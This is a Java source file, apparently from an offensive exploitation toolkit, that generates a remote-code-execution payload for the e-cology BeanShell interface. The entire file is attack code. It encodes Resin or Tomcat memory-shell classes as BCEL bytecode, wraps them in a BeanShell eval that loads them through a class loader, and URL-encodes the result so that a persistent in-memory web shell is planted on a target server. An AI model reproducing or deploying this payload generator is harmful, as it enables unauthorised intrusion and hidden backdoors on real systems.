package core.payloads;

import core.enumtypes.PayloadType;
import core.memshell.ResinFilterMemShell;
import core.memshell.ResinListenerMemShell;
import core.memshell.TomcatFilterMemShell;
import utils.Util;

import java.net.URLEncoder;

public class ECology_BeanShell_RCE {
    public static Object getObject(PayloadType type, String trojanType) throws Exception {
        byte[] bytecodes = null;
        String payloadTemplate = "a=\"{code}\";eval(\"new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(a).newInstance();\")";
        switch (type) {
            case resinfiltermemshell:
                bytecodes = Util.getClassBytes(ResinFilterMemShell.class);
                break;
            case resinlistenermemshell:
                bytecodes = Util.getClassBytes(ResinListenerMemShell.class);
                break;
            case tomcatfiltermemshell:
                bytecodes = Util.getClassBytes(TomcatFilterMemShell.class);
                break;
        }

        String bcelCodeStr = Util.generateBcelCode2(bytecodes);
        return URLEncoder.encode(payloadTemplate.replace("{code}", bcelCodeStr).replace("\n", ""));
    }

    public static byte[] getByte(PayloadType type, String trojanType) throws Exception {
        String payload = getObject(type, trojanType).toString();
        return payload.getBytes();
    }
}
